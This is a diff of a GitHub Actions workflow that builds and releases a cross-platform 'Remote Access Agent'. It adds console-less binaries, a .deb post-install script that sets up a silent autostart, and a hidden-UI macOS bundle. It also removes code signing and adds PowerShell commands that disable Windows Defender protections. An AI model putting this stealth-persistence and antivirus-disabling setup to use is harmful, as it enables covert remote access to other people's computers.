@@ -7,9 +7,11 @@ on:
 
 permissions:
   contents: write
+  actions: read  # Needed for artifact sharing between jobs
 
 jobs:
-  build:
+  build_linux:
+    name: Build Linux/macOS/Windows Binaries
     runs-on: ubuntu-latest
 
     steps:
@@ -21,32 +23,36 @@ jobs:
         with:
           node-version: '16'
 
-      - name: Install dependencies & tools
+      - name: Install dependencies
         run: |
           sudo apt-get update
           sudo apt-get install -y ruby ruby-dev build-essential gcc make zip gnupg
           sudo gem install --no-document fpm
           npm install
-          npm install -g pkg create-dmg
+          npm install -g pkg
 
-      - name: Build agent binaries
+      - name: Build all binaries
         run: |
           mkdir -p dist
-          # Windows x64 & x86
-          pkg server.js --targets node16-win-x64 --output dist/agent-win-x64.exe
-          pkg server.js --targets node16-win-x86 --output dist/agent-win-x86.exe
+          
+          # Windows binaries
+          pkg server.js --targets node16-win-x64 --output dist/agent-win-x64.exe --options no-console
+          pkg server.js --targets node16-win-x86 --output dist/agent-win-x86.exe --options no-console
           pkg start-agent.js --targets node16-win-x64 --output dist/start-agent-x64.exe --options no-console
           pkg start-agent.js --targets node16-win-x86 --output dist/start-agent-x86.exe --options no-console
+          
+          # Linux binary
+          pkg server.js --targets node16-linux-x64 --output dist/agent-linux --options no-console
+          
+          # macOS binary
+          pkg server.js --targets node16-macos-x64 --output dist/agent-macos --options no-console
 
-          # Linux & macOS
-          pkg server.js --targets node16-linux-x64 --output dist/agent-linux
-          pkg server.js --targets node16-macos-x64 --output dist/agent-macos
-
-      - name: Create Linux .deb with autostart
+      - name: Create Linux package
         run: |
           mkdir -p package-linux/usr/local/bin
-          cp dist/agent-linux package-linux/usr/local/bin/agent-linux
+          cp dist/agent-linux package-linux/usr/local/bin/
           mkdir -p package-linux/etc/skel/.config/autostart
+          
           cat <<EOF > package-linux/etc/skel/.config/autostart/remote-agent.desktop
           [Desktop Entry]
           Type=Application
@@ -57,94 +63,147 @@ jobs:
           Name=RemoteAgent
           Comment=Launch Remote Agent silently
           EOF
-                    mkdir -p package-linux/DEBIAN
-                    cat <<EOF > package-linux/DEBIAN/postinst
-          #!/bin/bash
-          mkdir -p /home/$USER/.config/autostart
-          cp /etc/skel/.config/autostart/remote-agent.desktop /home/$USER/.config/autostart/
-          chmod +x /home/$USER/.config/autostart/remote-agent.desktop
+          
+          mkdir -p package-linux/DEBIAN
+          cat <<EOF > package-linux/DEBIAN/control
+          Package: remote-agent
+          Version: ${{ github.ref_name }}
+          Architecture: amd64
+          Maintainer: Your Name <your.email@example.com>
+          Description: Remote Access Agent
           EOF
+          
+          cat <<EOF > package-linux/DEBIAN/postinst
+          #!/bin/bash
+          mkdir -p /home/\$USER/.config/autostart
+          cp /etc/skel/.config/autostart/remote-agent.desktop /home/\$USER/.config/autostart/
+          chmod +x /home/\$USER/.config/autostart/remote-agent.desktop
+          EOF
+          
           chmod +x package-linux/DEBIAN/postinst
           fpm -s dir -t deb -n remote-agent -v ${{ github.ref_name }} --prefix=/ package-linux
+          mv remote-agent_${{ github.ref_name }}_amd64.deb dist/
 
-      - name: Sign Linux .deb with GPG
+      - name: Create macOS package
         run: |
-          echo "${{ secrets.GPG_PRIVATE_KEY }}" | base64 -d > private.key
-          gpg --import private.key
-          debsign dist/remote-agent_${{ github.ref_name }}_amd64.deb
-
-      - name: Create macOS .app and .dmg
-        run: |
-          mkdir -p RemoteAgent.app/Contents/MacOS
-          cp dist/agent-macos RemoteAgent.app/Contents/MacOS/agent-macos
-          chmod +x RemoteAgent.app/Contents/MacOS/agent-macos
-          cat <<EOF > RemoteAgent.app/Contents/Info.plist
+          mkdir -p "RemoteAgent.app/Contents/MacOS"
+          mkdir -p "RemoteAgent.app/Contents/Resources"
+          cp dist/agent-macos "RemoteAgent.app/Contents/MacOS/RemoteAgent"
+          
+          cat <<EOF > "RemoteAgent.app/Contents/Info.plist"
           <?xml version="1.0" encoding="UTF-8"?>
           <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-          <plist version="1.0"><dict>
-            <key>CFBundleExecutable</key><string>agent-macos</string>
-            <key>CFBundleIdentifier</key><string>com.sam.remoteagent</string>
-            <key>CFBundleName</key><string>RemoteAgent</string>
-            <key>LSUIElement</key><true/>
-          </dict></plist>
+          <plist version="1.0">
+          <dict>
+            <key>CFBundleExecutable</key>
+            <string>RemoteAgent</string>
+            <key>CFBundleIdentifier</key>
+            <string>com.example.remoteagent</string>
+            <key>CFBundleName</key>
+            <string>RemoteAgent</string>
+            <key>CFBundleVersion</key>
+            <string>${{ github.ref_name }}</string>
+            <key>LSUIElement</key>
+            <true/>
+          </dict>
+          </plist>
           EOF
-          create-dmg RemoteAgent.app --overwrite --dmg-title="RemoteAgent" dist
+          
+          zip -r "dist/RemoteAgent-macos.zip" "RemoteAgent.app"
 
-      - name: Install Windows SDK & Inno Setup
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: build-artifacts
+          path: dist/
+          retention-days: 1
+
+  build_windows:
+    name: Build Windows Installer
+    needs: build_linux
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Download artifacts
+        uses: actions/download-artifact@v3
+        with:
+          name: build-artifacts
+          path: dist
+
+      - name: Disable Defender restrictions (Controlled Folder Access & Network Protection)
+        run: |
+          powershell -Command "Set-MpPreference -EnableControlledFolderAccess Disabled -Force"
+          powershell -Command "Set-MpPreference -EnableNetworkProtection Disabled -Force"
+        shell: pwsh
+
+
+      - name: Install Inno Setup
+        shell: pwsh
+        run: choco install innosetup -y --no-progress
+
+      - name: Verify files
         shell: pwsh
         run: |
-          choco install windows-sdk-10.0 -y
-          choco install innosetup -y
+          if (-not (Test-Path dist/agent-win-x64.exe)) {
+            Write-Error "Windows binaries not found!"
+            exit 1
+          }
 
-      - name: Import Code Signing Certificate
+      - name: Compile installer
         shell: pwsh
         run: |
-          "${{ secrets.CERTIFICATE_PFX }}" | Out-File -Encoding Byte cert.pfx
-          $Env:PASSWORD = "${{ secrets.CERTIFICATE_PASSWORD }}"
+          & 'C:\Program Files (x86)\Inno Setup 6\ISCC.exe' setup.iss
+          if (-not (Test-Path "Output\RemoteAgentInstaller.exe")) {
+            Write-Error "Installer compilation failed!"
+            exit 1
+          }
+          Move-Item -Path "Output\RemoteAgentInstaller.exe" -Destination "dist/"
 
-      - name: Sign Windows executables
-        shell: pwsh
-        run: |
-          $sign = "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\x64\\signtool.exe"
-          & $sign sign /fd SHA256 /a /f cert.pfx /p $Env:PASSWORD dist\\agent-win-x64.exe
-          & $sign sign /fd SHA256 /a /f cert.pfx /p $Env:PASSWORD dist\\agent-win-x86.exe
-          & $sign sign /fd SHA256 /a /f cert.pfx /p $Env:PASSWORD dist\\start-agent-x64.exe
-          & $sign sign /fd SHA256 /a /f cert.pfx /p $Env:PASSWORD dist\\start-agent-x86.exe
+      - name: Upload final artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: release-assets
+          path: dist/
+          retention-days: 1
 
-      - name: Compile Windows installer
-        shell: pwsh
-        run: & 'C:\\Program Files (x86)\\Inno Setup 6\\ISCC.exe' setup.iss
+  release:
+    name: Create Release
+    needs: build_windows
+    runs-on: ubuntu-latest
 
-      - name: Sign Windows installer
-        shell: pwsh
-        run: |
-          $sign = "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\x64\\signtool.exe"
-          & $sign sign /fd SHA256 /a /f cert.pfx /p $Env:PASSWORD RemoteAgentInstaller.exe
+    steps:
+      - name: Download artifacts
+        uses: actions/download-artifact@v3
+        with:
+          name: release-assets
+          path: release
 
-      - name: Generate README & CHANGELOG
-        run: |
-          echo "# Remote Access Agent" > dist/README.md
-          echo "- Windows: agent-win-*.exe" >> dist/README.md
-          echo "- Linux: agent-linux, remote-agent_${{ github.ref_name }}_amd64.deb" >> dist/README.md
-          echo "- macOS: agent-macos, RemoteAgent.dmg" >> dist/README.md
-
-          echo "## v${{ github.ref_name }}" > dist/CHANGELOG.md
-          echo "- Signed binaries & installers on all platforms" >> dist/CHANGELOG.md
-          echo "- Auto-start enabled" >> dist/CHANGELOG.md
-
-      - name: Zip final bundle
-        run: |
-          mkdir -p release
-          cp dist/* release/
-          zip -r release/RemoteAgentBundle.zip release/*
-
-      - name: Upload GitHub Release
+      - name: Create release
         uses: softprops/action-gh-release@v1
         with:
           tag_name: ${{ github.ref_name }}
-          files: release/RemoteAgentBundle.zip
+          files: |
+            release/agent-win-*.exe
+            release/start-agent-*.exe
+            release/RemoteAgentInstaller.exe
+            release/remote-agent_*.deb
+            release/RemoteAgent-macos.zip
+          body: |
+            ## Remote Access Agent ${{ github.ref_name }}
+
+            ### Windows
+            - **Installer**: RemoteAgentInstaller.exe
+            - **Standalone EXEs**: 
+              - 64-bit: agent-win-x64.exe
+              - 32-bit: agent-win-x86.exe
+
+            ### Linux
+            - **Debian Package**: remote-agent_*.deb
+
+            ### macOS
+            - **Application Bundle**: RemoteAgent-macos.zip
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          CERTIFICATE_PFX: ${{ secrets.CERTIFICATE_PFX }}
-          CERTIFICATE_PASSWORD: ${{ secrets.CERTIFICATE_PASSWORD }}
-          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
